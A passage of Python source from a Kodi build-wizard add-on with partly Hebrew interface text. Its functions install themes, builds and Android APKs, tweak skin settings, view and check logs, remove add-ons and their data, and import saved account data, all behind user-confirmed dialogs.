			wiz.log('INSTALLED %s: [שגיאות:%s]' % (percent, errors))
			DP.close()
			if url not in ["fresh", "normal"]: 
				wiz.forceUpdate()
				if KODIV >= 17: wiz.kodi17Fix()
				if test2 == True:
					wiz.lookandFeelData('save')
					wiz.defaultSkin()
					gotoskin = wiz.getS('defaultskin')
					skinSwitch.swapSkins(gotoskin)
					x = 0
					xbmc.sleep(1000)
					while not xbmc.getCondVisibility("Window.isVisible(yesnodialog)") and x < 150:
						x += 1
						xbmc.sleep(1000)

					if xbmc.getCondVisibility("Window.isVisible(yesnodialog)"):
						wiz.ebi('SendClick(11)')
					wiz.lookandFeelData('restore')
				elif test == True:
					skinSwitch.swapSkins(gotoskin)
					x = 0
					xbmc.sleep(1000)
					while not xbmc.getCondVisibility("Window.isVisible(yesnodialog)") and x < 150:
						x += 1
						xbmc.sleep(1000)

					if xbmc.getCondVisibility("Window.isVisible(yesnodialog)"):
						wiz.ebi('SendClick(11)')
					else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]' % COLOR2); return
					wiz.lookandFeelData('restore')
				else:
					wiz.ebi("ReloadSkin()")
					xbmc.sleep(1000)
					wiz.ebi("Container.Refresh") 
		else:
			wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]Theme Install: Cancelled![/COLOR]' % COLOR2)

			
			
def skin_homeselect():

	try:
		setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

		file = open(setting_file, 'r') 
		file_data= file.read()
		file.close()
		regex='<setting id="FirstRunSetup" type="bool(.+?)/setting>'
		m=re.compile(regex).findall(file_data)[0]
		file = open(setting_file, 'w') 
		file.write(file_data.replace('<setting id="FirstRunSetup" type="bool%s/setting>'%m,'<setting id="FirstRunSetup" type="bool"></setting>'))
		file.close()
	except:
		pass
			
			
def skin_lower():
	input= (ADDON.getSetting("lower"))
	if input == 'true':
    
    
		try:
			setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

			file = open(setting_file, 'r') 
			file_data= file.read()
			file.close()
			regex='<setting id="none_widget" type="bool(.+?)/setting>'
			m=re.compile(regex).findall(file_data)[0]
			file = open(setting_file, 'w') 
			file.write(file_data.replace('<setting id="none_widget" type="bool%s/setting>'%m,'<setting id="none_widget" type="bool">true</setting>'))
			file.close()
        
			# setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

			# file = open(setting_file, 'r') 
			# file_data= file.read()
			# file.close()
			# regex='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'
			# m=re.compile(regex).findall(file_data)[0]
			# file = open(setting_file, 'w') 
			# file.write(file_data.replace('<setting id="DisableOverlayColor" type="bool%s/setting>'%m,'<setting id="DisableOverlayColor" type="bool">true</setting>'))
			# file.close()
        
			# setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

			# file = open(setting_file, 'r') 
			# file_data= file.read()
			# file.close()
			# regex='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'
			# m=re.compile(regex).findall(file_data)[0]
			# file = open(setting_file, 'w') 
			# file.write(file_data.replace('<setting id="backgroundwallpaper" type="bool%s/setting>'%m,'<setting id="backgroundwallpaper" type="bool">true</setting>'))
			# file.close()
            
            
            
			# setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

			# file = open(setting_file, 'r') 
			# file_data= file.read()
			# file.close()
			# regex='<setting id="show.clearlogo" type="bool(.+?)/setting>'
			# m=re.compile(regex).findall(file_data)[0]
			# file = open(setting_file, 'w') 
			# file.write(file_data.replace('<setting id="show.clearlogo" type="bool%s/setting>'%m,'<setting id="show.clearlogo" type="bool">false</setting>'))
			# file.close()            
            
            
            
			# setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

			# file = open(setting_file, 'r') 
			# file_data= file.read()
			# file.close()
			# regex='<setting id="show.cdart" type="bool(.+?)/setting>'
			# m=re.compile(regex).findall(file_data)[0]
			# file = open(setting_file, 'w') 
			# file.write(file_data.replace('<setting id="show.cdart" type="bool%s/setting>'%m,'<setting id="show.cdart" type="bool">false</setting>'))
			# file.close() 
            
            
            
			# setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

			# file = open(setting_file, 'r') 
			# file_data= file.read()
			# file.close()
			# regex='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'
			# m=re.compile(regex).findall(file_data)[0]
			# file = open(setting_file, 'w') 
			# file.write(file_data.replace('<setting id="furniture.showhublogo" type="bool%s/setting>'%m,'<setting id="furniture.showhublogo" type="bool">false</setting>'))
			# file.close() 
            
            
            

		except:
			pass
			
def thirdPartyInstall(name, url):
	if not wiz.workingURL(url):
		LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]Invalid URL for Build[/COLOR]' % COLOR2); return
	type = DIALOG.yesno(ADDONTITLE, "[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]" % (COLOR2, COLOR1, COLOR1), "[COLOR %s]%s[/COLOR]" % (COLOR1, name), yeslabel="[B][COLOR green]Fresh Install[/COLOR][/B]", nolabel="[B][COLOR red]Normal Install[/COLOR][/B]")
	if type == 1:
		freshStart('third', True)
	wiz.clearS('build')
	zipname = name.replace('\\', '').replace('/', '').replace(':', '').replace('*', '').replace('?', '').replace('"', '').replace('<', '').replace('>', '').replace('|', '')
	if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
	DP.create(ADDONTITLE,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name),'', 'אנא המתן')
	lib=os.path.join(PACKAGES, '%s.zip' % zipname)
	try: os.remove(lib)
	except: pass
	downloader.download(url, lib, DP)
	xbmc.sleep(1000)
	title = '[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name)
	DP.update(0, title,'', 'אנא המתן')
	percent, errors, error = extract.all(lib,HOME,DP, title=title)
	if int(float(percent)) > 0:
		wiz.fixmetas()
		wiz.lookandFeelData('save')
		wiz.defaultSkin()
		#wiz.addonUpdates('set')
		wiz.setS('installed', 'true')
		wiz.setS('extract', str(percent))
		wiz.setS('errors', str(errors))
		wiz.log('INSTALLED %s: [ERRORS:%s]' % (percent, errors))
		try: os.remove(lib)
		except: pass
		if int(float(errors)) > 0:
			yes=DIALOG.yesno(ADDONTITLE, '[COLOR %s][COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name), 'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]' % (COLOR1, percent, '%', COLOR1, errors), 'האם תרצה להציג שגיאות?[/COLOR]', nolabel='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel='[B][COLOR green]הצג שגיאות[/COLOR][/B]')
			if yes:
				if isinstance(errors, unicode):
					error = error.encode('utf-8')
				wiz.TextBox(ADDONTITLE, error)
	DP.close()
	if KODIV >= 17: wiz.addonDatabase(ADDON_ID, 1)
	if INSTALLMETHOD == 1: todo = 1
	elif INSTALLMETHOD == 2: todo = 0
	else: todo = DIALOG.yesno(ADDONTITLE, "[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]" % (COLOR2, COLOR1, COLOR1), yeslabel="[B][COLOR green]Reload Profile[/COLOR][/B]", nolabel="[B][COLOR red]Force Close[/COLOR][/B]")
	if todo == 1: wiz.reloadFix()
	else: wiz.killxbmc(True)

def testTheme(path):
	zfile = zipfile.ZipFile(path)
	for item in zfile.infolist():
		if '/settings.xml' in item.filename:
			return True
	return False

def testGui(path):
	zfile = zipfile.ZipFile(path)
	for item in zfile.infolist():
		if '/guisettings.xml' in item.filename:
			return True
	return False

def apkInstaller(apk, url):
	wiz.log(apk)
	wiz.log(url)
	if wiz.platform() == 'android':
		yes = DIALOG.yesno(ADDONTITLE, "[COLOR %s]האם תרצה להוריד ולהתקין את:" % COLOR2, "[COLOR %s]%s[/COLOR]" % (COLOR1, apk), yeslabel="[B][COLOR green]התקן[/COLOR][/B]", nolabel="[B][COLOR red]ביטול[/COLOR][/B]")
		if not yes: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]ERROR: Install Cancelled[/COLOR]' % COLOR2); return
		display = apk
		if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
		if not wiz.workingURL(url) == True: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]' % COLOR2); return
		DP.create(ADDONTITLE,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, display),'', 'אנא המתן')
		lib=os.path.join(PACKAGES, "%s.apk" % apk.replace('\\', '').replace('/', '').replace(':', '').replace('*', '').replace('?', '').replace('"', '').replace('<', '').replace('>', '').replace('|', ''))
		try: os.remove(lib)
		except: pass
		downloader.download(url, lib, DP)
		xbmc.sleep(100)
		DP.close()
		notify.apkInstaller(apk)
		wiz.ebi('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+lib+'")')
	else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]ERROR: None Android Device[/COLOR]' % COLOR2)

###########################
###### Misc Functions######
###########################

def createMenu(type, add, name):
	if   type == 'saveaddon':
		menu_items=[]
		add2  = urllib.quote_plus(add.lower().replace(' ', ''))
		add3  = add.replace('Debrid', 'Real Debrid')
		name2 = urllib.quote_plus(name.lower().replace(' ', ''))
		name = name.replace('url', 'URL Resolver')
		menu_items.append((THEME2 % name.title(),             ' '))
		menu_items.append((THEME3 % 'Save %s Data' % add3,               'RunPlugin(plugin://%s/?mode=save%s&name=%s)' %    (ADDON_ID, add2, name2)))
		menu_items.append((THEME3 % 'Restore %s Data' % add3,            'RunPlugin(plugin://%s/?mode=restore%s&name=%s)' % (ADDON_ID, add2, name2)))
		menu_items.append((THEME3 % 'Clear %s Data' % add3,              'RunPlugin(plugin://%s/?mode=clear%s&name=%s)' %   (ADDON_ID, add2, name2)))
	elif type == 'save'    :
		menu_items=[]
		add2  = urllib.quote_plus(add.lower().replace(' ', ''))
		add3  = add.replace('Debrid', 'Real Debrid')
		name2 = urllib.quote_plus(name.lower().replace(' ', ''))
		name = name.replace('url', 'URL Resolver')
		menu_items.append((THEME2 % name.title(),             ' '))
		menu_items.append((THEME3 % 'Register %s' % add3,                'RunPlugin(plugin://%s/?mode=auth%s&name=%s)' %    (ADDON_ID, add2, name2)))
		menu_items.append((THEME3 % 'Save %s Data' % add3,               'RunPlugin(plugin://%s/?mode=save%s&name=%s)' %    (ADDON_ID, add2, name2)))
		menu_items.append((THEME3 % 'Restore %s Data' % add3,            'RunPlugin(plugin://%s/?mode=restore%s&name=%s)' % (ADDON_ID, add2, name2)))
		menu_items.append((THEME3 % 'Import %s Data' % add3,             'RunPlugin(plugin://%s/?mode=import%s&name=%s)' %  (ADDON_ID, add2, name2)))
		menu_items.append((THEME3 % 'Clear Addon %s Data' % add3,        'RunPlugin(plugin://%s/?mode=addon%s&name=%s)' %   (ADDON_ID, add2, name2)))
	elif type == 'install'  :
		menu_items=[]
		name2 = urllib.quote_plus(name)
		menu_items.append((THEME2 % name,                                'RunAddon(%s, ?mode=viewbuild&name=%s)'  % (ADDON_ID, name2)))
		menu_items.append((THEME3 % 'Fresh Install',                     'RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'  % (ADDON_ID, name2)))
		menu_items.append((THEME3 % 'Normal Install',                    'RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)' % (ADDON_ID, name2)))
		menu_items.append((THEME3 % 'Apply guiFix',                      'RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'    % (ADDON_ID, name2)))
		menu_items.append((THEME3 % 'Build Information',                 'RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'  % (ADDON_ID, name2)))
	menu_items.append((THEME2 % '%s Settings' % ADDONTITLE,              'RunPlugin(plugin://%s/?mode=settings)' % ADDON_ID))
	return menu_items

def toggleCache(state):
	cachelist = ['includevideo', 'includeall', 'includebob', 'includephoenix', 'includespecto', 'includegenesis', 'includeexodus', 'includeonechan', 'includesalts', 'includesaltslite']
	titlelist = ['Include Video Addons', 'Include All Addons', 'Include Bob', 'Include Phoenix', 'Include Specto', 'Include Genesis', 'Include Exodus', 'Include One Channel', 'Include Salts', 'Include Salts Lite HD']
	if state in ['true', 'false']:
		for item in cachelist:
			wiz.setS(item, state)
	else:
		if not state in ['includevideo', 'includeall'] and wiz.getS('includeall') == 'true':
			try:
				item = titlelist[cachelist.index(state)]
				DIALOG.ok(ADDONTITLE, "[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]" % (COLOR2, COLOR1, COLOR1, item))
			except:
				wiz.LogNotify("[COLOR %s]Toggle Cache[/COLOR]" % COLOR1, "[COLOR %s]Invalid id: %s[/COLOR]" % (COLOR2, state))
		else:
			new = 'true' if wiz.getS(state) == 'false' else 'false'
			wiz.setS(state, new)

def playVideo(url):
	wiz.log("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s" % url)
	if 'watch?v=' in url:
		a, b = url.split('?')
		find = b.split('&')
		for item in find:
			if item.startswith('v='):
				url = item[2:]
				break
			else: continue
	elif 'embed' in url or 'youtu.be' in url:
		wiz.log("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s" % url)
		a = url.split('/')
		if len(a[-1]) > 5:
			url = a[-1]
		elif len(a[-2]) > 5:
			url = a[-2]
	wiz.log("YouTube URL: %s" % url)
	yt.PlayVideo(url)

def viewLogFile():
	mainlog = wiz.Grab_Log(True)
	oldlog  = wiz.Grab_Log(True, True)
	which = 0; logtype = mainlog
	if not oldlog == False and not mainlog == False:
		which = DIALOG.select(ADDONTITLE, ["View %s" % mainlog.replace(LOG, ""), "View %s" % oldlog.replace(LOG, "")])
		if which == -1: wiz.LogNotify('[COLOR %s]View Log[/COLOR]' % COLOR1, '[COLOR %s]View Log Cancelled![/COLOR]' % COLOR2); return
	elif mainlog == False and oldlog == False:
		wiz.LogNotify('[COLOR %s]View Log[/COLOR]' % COLOR1, '[COLOR %s]No Log File Found![/COLOR]' % COLOR2)
		return
	elif not mainlog == False: which = 0
	elif not oldlog == False: which = 1
	
	logtype = mainlog if which == 0 else oldlog
	msg     = wiz.Grab_Log(False) if which == 0 else wiz.Grab_Log(False, True)
	
	wiz.TextBox("%s - %s" % (ADDONTITLE, logtype), msg)

def errorChecking(log=None, count=None, all=None):
	if log == None:
		mainlog = wiz.Grab_Log(True)
		oldlog  = wiz.Grab_Log(True, True)
		if not oldlog == False and not mainlog == False:
			which = DIALOG.select(ADDONTITLE, ["View %s: %s error(s)" % (mainlog.replace(LOG, ""), errorChecking(mainlog, True, True)), "View %s: %s error(s)" % (oldlog.replace(LOG, ""), errorChecking(oldlog, True, True))])
			if which == -1: wiz.LogNotify('[COLOR %s]View Log[/COLOR]' % COLOR1, '[COLOR %s]View Log Cancelled![/COLOR]' % COLOR2); return
		elif mainlog == False and oldlog == False:
			wiz.LogNotify('[COLOR %s]View Log[/COLOR]' % COLOR1, '[COLOR %s]No Log File Found![/COLOR]' % COLOR2)
			return
		elif not mainlog == False: which = 0
		elif not oldlog == False: which = 1
		log = mainlog if which == 0 else oldlog
	if log == False:
		if count == None:
			wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]Log File not Found[/COLOR]" % COLOR2)
			return False
		else: 
			return 0
	else:
		if os.path.exists(log):
			f = open(log,mode='r'); a = f.read().replace('\n', '').replace('\r', ''); f.close()
			match = re.compile("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall(a)
			if not count == None:
				if all == None: 
					x = 0
					for item in match:
						if ADDON_ID in item: x += 1
					return x
				else: return len(match)
			if len(match) > 0:
				x = 0; msg = ""
				for item in match:
					if all == None and not ADDON_ID in item: continue
					else: 
						x += 1
						msg += "[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n" % (x, item.replace('                                          ', '\n').replace('\\\\','\\').replace(HOME, ''))
				if x > 0:
					wiz.TextBox(ADDONTITLE, msg)
				else: wiz.LogNotify(ADDONTITLE, "No Errors Found in Log")
			else: wiz.LogNotify(ADDONTITLE, "No Errors Found in Log")
		else: wiz.LogNotify(ADDONTITLE, "Log File not Found")

ACTION_PREVIOUS_MENU 			=  10	## ESC action
ACTION_NAV_BACK 				=  92	## Backspace action
ACTION_MOVE_LEFT				=   1	## Left arrow key
ACTION_MOVE_RIGHT 				=   2	## Right arrow key
ACTION_MOVE_UP 					=   3	## Up arrow key
ACTION_MOVE_DOWN 				=   4	## Down arrow key
ACTION_MOUSE_WHEEL_UP 			= 104	## Mouse wheel up
ACTION_MOUSE_WHEEL_DOWN			= 105	## Mouse wheel down
ACTION_MOVE_MOUSE 				= 107	## Down arrow key
ACTION_SELECT_ITEM				=   7	## Number Pad Enter
ACTION_BACKSPACE				= 110	## ?
ACTION_MOUSE_LEFT_CLICK 		= 100
ACTION_MOUSE_LONG_CLICK 		= 108

def LogViewer(default=None):
	class LogViewer(xbmcgui.WindowXMLDialog):
		def __init__(self,*args,**kwargs):
			self.default = kwargs['default']

		def onInit(self):
			self.title      = 101
			self.msg        = 102
			self.scrollbar  = 103
			self.upload     = 201
			self.kodi       = 202
			self.kodiold    = 203
			self.wizard     = 204 
			self.okbutton   = 205 
			f = open(self.default, 'r')
			self.logmsg = f.read()
			f.close()
			self.titlemsg = "%s: %s" % (ADDONTITLE, self.default.replace(LOG, '').replace(ADDONDATA, ''))
			self.showdialog()

		def showdialog(self):
			self.getControl(self.title).setLabel(self.titlemsg)
			self.getControl(self.msg).setText(wiz.highlightText(self.logmsg))
			self.setFocusId(self.scrollbar)
			
		def onClick(self, controlId):
			if   controlId == self.okbutton: self.close()
			elif controlId == self.upload: self.close(); uploadLog.Main()
			elif controlId == self.kodi:
				newmsg = wiz.Grab_Log(False)
				filename = wiz.Grab_Log(True)
				if newmsg == False:
					self.titlemsg = "%s: View Log Error" % ADDONTITLE
					self.getControl(self.msg).setText("Log File Does Not Exists!")
				else:
					self.titlemsg = "%s: %s" % (ADDONTITLE, filename.replace(LOG, ''))
					self.getControl(self.title).setLabel(self.titlemsg)
					self.getControl(self.msg).setText(wiz.highlightText(newmsg))
					self.setFocusId(self.scrollbar)
			elif controlId == self.kodiold:  
				newmsg = wiz.Grab_Log(False, True)
				filename = wiz.Grab_Log(True, True)
				if newmsg == False:
					self.titlemsg = "%s: View Log Error" % ADDONTITLE
					self.getControl(self.msg).setText("Log File Does Not Exists!")
				else:
					self.titlemsg = "%s: %s" % (ADDONTITLE, filename.replace(LOG, ''))
					self.getControl(self.title).setLabel(self.titlemsg)
					self.getControl(self.msg).setText(wiz.highlightText(newmsg))
					self.setFocusId(self.scrollbar)
			elif controlId == self.wizard:
				newmsg = wiz.Grab_Log(False, False, True)
				filename = wiz.Grab_Log(True, False, True)
				if newmsg == False:
					self.titlemsg = "%s: View Log Error" % ADDONTITLE
					self.getControl(self.msg).setText("Log File Does Not Exists!")
				else:
					self.titlemsg = "%s: %s" % (ADDONTITLE, filename.replace(ADDONDATA, ''))
					self.getControl(self.title).setLabel(self.titlemsg)
					self.getControl(self.msg).setText(wiz.highlightText(newmsg))
					self.setFocusId(self.scrollbar)
		
		def onAction(self, action):
			if   action == ACTION_PREVIOUS_MENU: self.close()
			elif action == ACTION_NAV_BACK: self.close()
	if default == None: default = wiz.Grab_Log(True)
	lv = LogViewer( "LogViewer.xml" , ADDON.getAddonInfo('path'), 'DefaultSkin', default=default)
	lv.doModal()
	del lv

def removeAddon(addon, name, over=False):
	if not over == False:
		yes = 1
	else: 
		yes = DIALOG.yesno(ADDONTITLE, '[COLOR %s]Are you sure you want to delete the addon:'% COLOR2, 'Name: [COLOR %s]%s[/COLOR]' % (COLOR1, name), 'ID: [COLOR %s]%s[/COLOR][/COLOR]' % (COLOR1, addon), yeslabel='[B][COLOR green]Remove Addon[/COLOR][/B]', nolabel='[B][COLOR red]Don\'t Remove[/COLOR][/B]')
	if yes == 1:
		folder = os.path.join(ADDONS, addon)
		wiz.log("Removing Addon %s" % addon)
		wiz.cleanHouse(folder)
		xbmc.sleep(1000)
		try: shutil.rmtree(folder)
		except Exception as e: wiz.log("Error removing %s" % addon, xbmc.LOGNOTICE)
		removeAddonData(addon, name, over)
	if over == False:
		wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]%s Removed[/COLOR]" % (COLOR2, name))

def removeAddonData(addon, name=None, over=False):
	if addon == 'all':
		if DIALOG.yesno(ADDONTITLE, '[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]' % (COLOR2, COLOR1), yeslabel='[B][COLOR green]Remove Data[/COLOR][/B]', nolabel='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):
			wiz.cleanHouse(ADDOND)
		else: wiz.LogNotify('[COLOR %s]Remove Addon Data[/COLOR]' % COLOR1, '[COLOR %s]Cancelled![/COLOR]' % COLOR2)
	elif addon == 'uninstalled':
		if DIALOG.yesno(ADDONTITLE, '[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]' % (COLOR2, COLOR1), yeslabel='[B][COLOR green]Remove Data[/COLOR][/B]', nolabel='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):
			total = 0
			for folder in glob.glob(os.path.join(ADDOND, '*')):
				foldername = folder.replace(ADDOND, '').replace('\\', '').replace('/', '')
				if foldername in EXCLUDES: pass
				elif os.path.exists(os.path.join(ADDONS, foldername)): pass
				else: wiz.cleanHouse(folder); total += 1; wiz.log(folder); shutil.rmtree(folder)
			wiz.LogNotify('[COLOR %s]Clean up Uninstalled[/COLOR]' % COLOR1, '[COLOR %s]%s Folders(s) Removed[/COLOR]' % (COLOR2, total))
		else: wiz.LogNotify('[COLOR %s]Remove Addon Data[/COLOR]' % COLOR1, '[COLOR %s]Cancelled![/COLOR]' % COLOR2)
	elif addon == 'empty':
		if DIALOG.yesno(ADDONTITLE, '[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]' % (COLOR2, COLOR1), yeslabel='[B][COLOR green]Remove Data[/COLOR][/B]', nolabel='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):
			total = wiz.emptyfolder(ADDOND)
			wiz.LogNotify('[COLOR %s]Remove Empty Folders[/COLOR]' % COLOR1, '[COLOR %s]%s Folders(s) Removed[/COLOR]' % (COLOR2, total))
		else: wiz.LogNotify('[COLOR %s]Remove Empty Folders[/COLOR]' % COLOR1, '[COLOR %s]Cancelled![/COLOR]' % COLOR2)
	else:
		addon_data = os.path.join(USERDATA, 'addon_data', addon)
		if addon in EXCLUDES:
			wiz.LogNotify("[COLOR %s]Protected Plugin[/COLOR]" % COLOR1, "[COLOR %s]Not allowed to remove Addon_Data[/COLOR]" % COLOR2)
		elif os.path.exists(addon_data):  
			if DIALOG.yesno(ADDONTITLE, '[COLOR %s]Would you also like to remove the addon data for:[/COLOR]' % COLOR2, '[COLOR %s]%s[/COLOR]' % (COLOR1, addon), yeslabel='[B][COLOR green]Remove Data[/COLOR][/B]', nolabel='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):
				wiz.cleanHouse(addon_data)
				try:
					shutil.rmtree(addon_data)
				except:
					wiz.log("Error deleting: %s" % addon_data)
			else: 
				wiz.log('Addon data for %s was not removed' % addon)
	wiz.refresh()

def restoreit(type):
	if type == 'build':
		x = freshStart('restore')
		if x == False: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]Local Restore Cancelled[/COLOR]" % COLOR2); return
	if not wiz.currSkin() in ['skin.confluence', 'skin.estouchy','skin.estuary','skin.Premium.mod']:
		wiz.skinToDefault()
	wiz.restoreLocal(type)

def restoreextit(type):
	if type == 'build':
		x = freshStart('restore')
		if x == False: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]External Restore Cancelled[/COLOR]" % COLOR2); return
	wiz.restoreExternal(type)

def buildInfo(name):
	if wiz.workingURL(SPEEDFILE) == True:
		if wiz.checkBuild(name, 'url'):
			name, version, url, gui, kodi, theme, icon, fanart, preview, adult, description = wiz.checkBuild(name, 'all')
			adult = 'Yes' if adult.lower() == 'yes' else 'No'
			msg  = "[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]" % (COLOR2, COLOR1, name)
			msg += "[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]" % (COLOR2, COLOR1, version)
			if not theme == "http://":
				themecount = wiz.themeCount(name, False)
				msg += "[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]" % (COLOR2, COLOR1, ', '.join(themecount))
			msg += "[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]" % (COLOR2, COLOR1, kodi)
			msg += "[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]" % (COLOR2, COLOR1, adult)
			msg += "[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]" % (COLOR2, COLOR1, description)
			wiz.TextBox(ADDONTITLE, msg)
		else: wiz.log("Invalid Build Name!")
	else: wiz.log("Build text file not working: %s" % WORKINGURL)

def buildVideo(name):
	wiz.log("DDDDDDDDDDDDDDDDDDDDDDDDD: %s" % wiz.workingURL(SPEEDFILE))
	if wiz.workingURL(SPEEDFILE) == True:
		videofile = wiz.checkBuild(name, 'preview')
		wiz.log("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s" % name)
		if videofile and not videofile == 'http://': playVideo(videofile)
		else: wiz.log("[%s]Unable to find url for video preview" % name)
	else: wiz.log("Build text file not working: %s" % WORKINGURL)

def dependsList(plugin):
	addonxml = os.path.join(ADDONS, plugin, 'addon.xml')
	if os.path.exists(addonxml):
		source = open(addonxml,mode='r'); link = source.read(); source.close(); 
		match  = wiz.parseDOM(link, 'import', ret='addon')
		items  = []
		for depends in match:
			if not 'xbmc.python' in depends:
				items.append(depends)
		return items
	return []

def manageSaveData(do):
	if do == 'import':
		TEMP = os.path.join(ADDONDATA, 'temp')
		if not os.path.exists(TEMP): os.makedirs(TEMP)
		source = DIALOG.browse(1, '[COLOR %s]Select the location of the SaveData.zip[/COLOR]' % COLOR2, 'files', '.zip', False, False, HOME)
		if not source.endswith('.zip'):
			wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]Import Data Error![/COLOR]" % (COLOR2))
			return
		tempfile = os.path.join(MYBUILDS, 'SaveData.zip')
		goto = xbmcvfs.copy(source, tempfile)
		wiz.log("%s" % str(goto))
		extract.all(xbmc.translatePath(tempfile), TEMP)
		trakt  = os.path.join(TEMP, 'trakt')
		login  = os.path.join(TEMP, 'login')
		debrid = os.path.join(TEMP, 'debrid')
		x = 0
		if os.path.exists(trakt):
			x += 1
			files = os.listdir(trakt)
			if not os.path.exists(traktit.TRAKTFOLD): os.makedirs(traktit.TRAKTFOLD)
			for item in files:
				old  = os.path.join(traktit.TRAKTFOLD, item)
				temp = os.path.join(trakt, item)
				if os.path.exists(old):
					if not DIALOG.yesno(ADDONTITLE, "[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?" % (COLOR2, COLOR1, item), yeslabel="[B][COLOR green]Yes Replace[/COLOR][/B]", nolabel="[B][COLOR red]No Skip[/COLOR][/B]"): continue
					else: os.remove(old)
				shutil.copy(temp, old)
			traktit.importlist('all')
			traktit.traktIt('restore', 'all')
		if os.path.exists(login):
			x += 1
			files = os.listdir(login)
			if not os.path.exists(loginit.LOGINFOLD): os.makedirs(loginit.LOGINFOLD)
			for item in files:
				old  = os.path.join(loginit.LOGINFOLD, item)
				temp = os.path.join(login, item)
				if os.path.exists(old):
					if not DIALOG.yesno(ADDONTITLE, "[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?" % (COLOR2, COLOR1, item), yeslabel="[B][COLOR green]Yes Replace[/COLOR][/B]", nolabel="[B][COLOR red]No Skip[/COLOR][/B]"): continue
					else: os.remove(old)
				shutil.copy(temp, old)
			loginit.importlist('all')
			loginit.loginIt('restore', 'all')
		if os.path.exists(debrid):
			x += 1
			files = os.listdir(debrid)
			if not os.path.exists(debridit.REALFOLD): os.makedirs(debridit.REALFOLD)
			for item in files:
				old  = os.path.join(debridit.REALFOLD, item)
				temp = os.path.join(debrid, item)
				if os.path.exists(old):
					if not DIALOG.yesno(ADDONTITLE, "[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?" % (COLOR2, COLOR1, item), yeslabel="[B][COLOR green]Yes Replace[/COLOR][/B]", nolabel="[B][COLOR red]No Skip[/COLOR][/B]"): continue
					else: os.remove(old)
				shutil.copy(temp, old)
			debridit.importlist('all')
